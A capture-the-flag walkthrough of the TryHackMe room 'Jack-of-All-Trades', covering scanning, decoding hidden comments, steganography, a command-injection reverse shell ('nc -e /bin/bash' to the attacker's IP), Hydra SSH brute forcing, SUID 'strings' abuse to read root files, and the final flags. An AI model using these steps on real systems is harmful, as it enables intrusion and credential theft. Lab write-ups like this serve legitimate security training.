# Jack-of-All-Trades

Boot-to-root originally designed for Securi-Tay 2020

[Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)

## Topic's

- Network Enumeration
- Web Poking
- Cryptography
  - Base64
  - Base32
  - Hex
  - ROT13
- Steganography
- Code Injection (RCE)
- Brute Forcing SSH
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ sudo nmap -A -sS -sC -sV -O 10.10.148.108
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 14:23 CEST
Nmap scan report for 10.10.148.108
Host is up (0.045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=43743%PV=Y%DS=2%DC=T%G=Y%TM=5F86ED
OS:F3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=105%GCD=1%ISR=10E%TI=Z%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   36.04 ms 10.8.0.1
2   36.52 ms 10.10.148.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.50 seconds
```

[view-source:http://10.10.148.108:22/](view-source:http://10.10.148.108:22/)

```
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```

`UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==`

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVu Y29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d

Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ steghide extract -sf header.jpg
Enter passphrase:
wrote extracted data to "cms.creds".
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

[view-source:http://10.10.148.108:22/recovery.php](view-source:http://10.10.148.108:22/recovery.php)

```
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->

	</body>
</html>
```

```
echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'

Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

[http://10.10.148.108:22/nnxhweOV/index.php](http://10.10.148.108:22/nnxhweOV/index.php)

`?cmd=nc%20-e%20/bin/bash%2010.8.106.222%2080%209001`

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.148.108] 53706
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cd /home
ls
jack
jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ hydra -l jack -P jacks_password_list -s 80 10.10.148.108 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 14:36:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.148.108:80/
[80][ssh] host: 10.10.148.108   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 14:36:52
```

`jack:ITMJpGGIqg1jn?>@`

```
jack@jack-of-all-trades:~$ ls -la
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
jack@jack-of-all-trades:~$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.8.106.222 - - [14/Oct/2020 13:40:55] "GET /user.jpg HTTP/1.1" 200 -
```

![](./user.jpg)

`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`

```
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack:
Sorry, user jack may not run sudo on jack-of-all-trades.
jack@jack-of-all-trades:~$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

1. User Flag

`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`

2. Root Flag

`securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}`
